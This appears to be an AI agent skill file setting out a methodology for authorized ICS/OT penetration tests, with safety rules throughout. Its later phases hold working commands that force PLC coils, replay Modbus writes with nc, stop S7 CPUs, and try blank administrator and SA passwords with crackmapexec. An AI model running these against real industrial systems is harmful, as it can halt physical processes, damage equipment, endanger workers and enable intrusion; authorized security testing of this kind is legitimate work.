---
name: ics-technique
description: "Auth assessment: ICS/OT methodology; passive-first Modbus, DNP3, S7, BACnet, OPC UA, PLC/HMI evidence, safety gates."
license: MIT
compatibility: "Linux/Windows; Python 3.8+; pymodbus, python-snap7, or equivalent ICS libraries."
metadata:
  author: AeonDave
  version: "1.0"
  category: offensive-techniques
  language: multi
---

# ICS Technique

Goal: map the OT attack surface, assess reachable field devices and control systems, and identify exploitable weaknesses — while keeping safety of industrial processes and physical equipment as a hard constraint throughout.

## When this technique applies

- Authorized OT/ICS penetration test or red team engagement.
- Compromise of IT network with visibility into an OT segment (IT/OT pivot).
- Assessment of exposed ICS protocols on a DMZ or internet-facing SCADA interface.
- Evaluation of HMI, engineering workstation, or historian security posture.
- Verification that safety instrumented systems (SIS) are isolated from corporate network.

## Boundary with other skills

- **IT network scanning and exploitation**: use `network-technique` and `vuln-exploit-technique` for Windows/Linux hosts in OT (historians, EWS).
- **Physical hardware access**: UART, JTAG, flash dump on PLCs/RTUs → `hardware-technique`.
- **RF and wireless sensor networks**: 900 MHz, Zigbee, WirelessHART, ISA100 → `wireless-technique`.
- **CTF ICS lab tasks**: simulated challenges → `ics-ctf`.
- **Malware and implant deployment**: coordinate with `post-exploit-technique`; scope explicitly with client.

## Safety-first operating model

ICS assessments differ from IT because mistakes can trigger physical process failures, equipment damage, or safety hazards:

1. **Verify isolation**: confirm the target is a lab PLC, test segment, or authorized production window with the client's process engineer present.
2. **Never write before reading**: enumerate registers, coils, and device state before any write or command.
3. **No force-writes to safety outputs**: digital outputs mapped to SIS, emergency shutdown, relief valves, or actuators are out of scope unless explicitly cleared by the client's process safety team.
4. **Prefer passive and read-only**: passive sniffing and read operations carry near-zero process risk; writes and command injection require pre-approval and a rollback plan.
5. **Avoid aggressive scanning**: OT devices have real-time constraints — Nessus default policy, masscan, or syn-scan rates safe for IT can overload PLC CPUs, drop control frames, and disrupt processes.

## Agent operating model

```
Loop:
  1. Passive enumeration — capture OT traffic, identify hosts and protocols.
  2. Device fingerprinting — identify PLCs, RTUs, HMIs, historians by protocol response.
  3. Read-only interrogation — enumerate coils, registers, tags, diagnostics.
  4. Document attack surface — flag write-capable paths and associated process risk.
  5. Active exploitation — only after explicit client approval, with rollback plan.
  6. IT/OT pivot — escalate from OT device to engineering workstation or historian.

Stop when: objective achieved, safety gate triggered, or scope boundary reached.
```

---

## Phase 1 — Passive OT network enumeration

Zero active probing. Capture and decode existing traffic without sending a packet.

```bash
# Capture on OT segment via tap or span port
tcpdump -i eth0 -w ot_capture.pcap

# Zeek for automatic protocol detection and summary
zeek -r ot_capture.pcap
# Review: conn.log (hosts/ports), modbus.log, dnp3.log, s7.log

# Wireshark display filters:
#   Modbus TCP:   tcp.port == 502
#   DNP3:         dnp3
#   EtherNet/IP:  enip
#   S7comm:       s7comm
#   BACnet:       bacnet
#   IEC 60870-5-104: iec104
#   OPC-UA:       opcua
#   Profinet DCP: pn_dcp
```

Passive goals:
- Identify all OT hosts (IP, MAC, hostname if visible in DCP/mDNS).
- Map protocol types per host and communication pattern (polling vs event-driven).
- Identify master/slave relationships (e.g., HMI → PLC polling cycle).
- Spot unencrypted protocol traffic that can be replayed or injected.

---

## Phase 2 — Active device fingerprinting

Light active probing — read-only operations only at this stage.

### Modbus (TCP 502)

```bash
# nmap Modbus unit ID scan
nmap --script modbus-discover -p 502 <target>

# Python: scan unit IDs 1–247 for responding slaves
python3 - <<'EOF'
from pymodbus.client import ModbusTcpClient
c = ModbusTcpClient('<target>', port=502)
c.connect()
for uid in range(1, 248):
    r = c.read_holding_registers(0, 1, slave=uid)
    if not r.isError():
        print(f"Unit ID {uid}: responding")
c.close()
EOF
```

### EtherNet/IP / CIP (TCP 44818, UDP 2222)

```bash
nmap -sV --script enip-info -p 44818 <target>
# Returns: vendor, product name, serial number, firmware revision
```

### Siemens S7comm (TCP 102)

```bash
nmap -sV --script s7-info -p 102 <target>
# Returns: module name, plant ID, firmware version, CPU state

python3 - <<'EOF'
import snap7
c = snap7.client.Client()
c.connect('<target>', 0, 1)   # rack=0, slot=1 — adjust per model
print(c.get_cpu_info())
c.disconnect()
EOF
```

### DNP3 (TCP/UDP 20000)

```bash
nmap --script dnp3-info -p 20000 <target>
```

### BACnet (UDP 47808)

```bash
nmap --script bacnet-info -p U:47808 <target>
```

### OPC-UA (TCP 4840)

```bash
# opcua-client-gui or python-opcua
python3 - <<'EOF'
from opcua import Client
c = Client("opc.tcp://<target>:4840")
c.connect()
root = c.get_root_node()
print(root.get_children())
c.disconnect()
EOF
```

---

## Phase 3 — Protocol-level read interrogation

Read registers, coils, and device diagnostics. No writes at this phase.

### Modbus read operations

```python
from pymodbus.client import ModbusTcpClient

c = ModbusTcpClient('<target>', port=502)
c.connect()
slave = 1

# Coils (digital outputs) — FC01
coils = c.read_coils(0, 64, slave=slave)
# Discrete inputs (digital inputs) — FC02
di = c.read_discrete_inputs(0, 64, slave=slave)
# Holding registers (analog/config values) — FC03
hr = c.read_holding_registers(0, 32, slave=slave)
# Input registers (sensor readings) — FC04
ir = c.read_input_registers(0, 32, slave=slave)

c.close()
```

### S7 read operations

```python
import snap7

c = snap7.client.Client()
c.connect('<target>', 0, 1)
# Read data block DB1, byte 0, 100 bytes
data = c.db_read(1, 0, 100)
print(data.hex())
# Read Merker (bit memory)
m = c.read_area(snap7.type.Areas.MK, 0, 0, 10)
c.disconnect()
```

Document: register ranges in use, coil states mapped to physical outputs, configuration registers (setpoints, PID parameters, alarm thresholds).

---

## Phase 4 — Attack path identification and active exploitation

Classify write-capable paths by process risk before proceeding.

| Target | Action | Risk | Proceed when |
|--------|--------|------|--------------|
| Holding register (setpoint) | Write new value | Medium | Lab PLC or explicit approval + rollback ready |
| Output coil (digital out) | Force ON/OFF | High | Lab target, actuator disconnected |
| Safety coil / SIS output | Any write | Critical | Never without SIS engineer present and isolation confirmed |
| S7 DB block | Write tag | Medium-High | Lab or frozen process window |
| HMI session | Inject command | High | Lab only |

### Modbus write (approved lab only)

```python
# ALWAYS read and record current state for rollback before writing
current = c.read_coils(0, 1, slave=slave)
print("Before:", current.bits[0])

c.write_coil(0, True, slave=slave)      # force output ON

# Restore immediately after test
c.write_coil(0, current.bits[0], slave=slave)
```

### Modbus replay attack

```bash
# Capture legitimate write command (Wireshark → Export raw bytes), replay
echo -n '<hex_payload>' | xxd -r -p | nc <target> 502
```

### S7 CPU stop (lab only — causes PLC to halt all outputs)

```python
c.plc_stop()   # halts execution; only in isolated lab
c.plc_hot_start()  # resume
```

---

## Phase 5 — HMI and engineering workstation exploitation

HMIs and EWS run Windows and are the primary IT/OT pivot target.

```bash
# Enumerate Windows hosts in OT network (gentle scan — avoid aggressive rate)
nmap -sV -T2 -p 135,139,445,3389,4840 <ot_subnet>/24

# Common vulnerable software on EWS/HMI (often unpatched Windows XP/7/2008):
#   WinCC, FactoryTalk, iFix, Ignition, Wonderware, Citect, InTouch
searchsploit "WinCC" "FactoryTalk" "Wonderware" "Citect" "Inductive Automation"

# Default credentials common on HMI/VNC (check before exploitation)
crackmapexec smb <ot_subnet>/24 -u administrator -p '' administrator --local-auth
# VNC: password "password", "1234", or blank
```

### Historian exploitation

Historians (OSIsoft PI, Honeywell PHD, AspenTech IP21) store all process data and often bridge IT and OT networks.

```bash
# OSIsoft PI — port 5450 (PI Data Archive)
# PI Web API if DMZ-bridged: https://<historian>/piwebapi/
curl -k https://<historian>/piwebapi/

# SQL Server on historian (MSSQL — often SA with weak password)
nmap -p 1433 <historian>
crackmapexec mssql <historian> -u sa -p '' --local-auth
```

Historian compromise gives:
- Full process history and operating parameters.
- Credentials for field device connections (PLCs, DCS).
- Pivot path into corporate IT if historian bridges both networks.

---

## Phase 6 — IT/OT boundary pivoting

```
Common pivot paths:
  Corporate IT → Historian (dual-homed) → OT network
  Corporate IT → Remote access jump server → HMI
  Corporate IT → Engineering workstation (VPN tunnel) → PLC

Tunneling tools: chisel, ligolo-ng; proxychains for chaining through compromised EWS.
```

### Credential reuse from device config

- Router admin on OT switch manages PLC firmware updates.
- Historian service account has domain credentials → lateral movement on IT.
- Remote access credentials (VPN, TeamViewer) on EWS often reuse corporate passwords.
- PLC project files (.s7p, .acd, .rsp) may contain plaintext passwords for online connections.

---

## Quality gates

- Passive capture complete before any active probe.
- No writes executed without reading and recording current state first.
- Safety-mapped outputs (SIS, emergency shutdown, relief valves) explicitly excluded or client-cleared.
- Every active action logged: timestamp, function code, address, value.
- Client process engineer available or on-call during any active write phase.
- Scan rate kept low (T2 or lower for nmap; manual single-target queries for ICS protocols).

## Anti-patterns

- Writing coils or registers without confirming they are not safety-linked.
- Using IT-oriented aggressive scanners (Nessus default policy, masscan) on OT segments — causes PLC CPU overload and process disruption.
- Assuming IT techniques transfer directly: OT devices have real-time constraints and drop connections under normal IT scan rates.
- Pivoting into OT without client awareness of blast radius.
- Treating historian exploitation as low-risk — historians bridge IT/OT and their compromise is always high-impact.
- Leaving any write-side change in place without client confirmation of restoration.

## Resources

- [references/ics-protocols.md](references/ics-protocols.md) — Protocol reference: Modbus function codes, S7comm areas/function codes, DNP3 object groups, EtherNet/IP CIP services, BACnet object types, IEC 104 ASDU types, OPC-UA node enumeration.
- [references/ics-enumeration.md](references/ics-enumeration.md) — Active fingerprinting commands per protocol, nmap ICS scripts, pymodbus/snap7/cpppo usage patterns, Zeek OT log analysis, passive asset discovery workflow.
- [references/ics-safety-gates.md](references/ics-safety-gates.md) — Risk classification for ICS actions, SIS boundary identification, approved-action templates, rollback procedures, engagement rules for production environments.
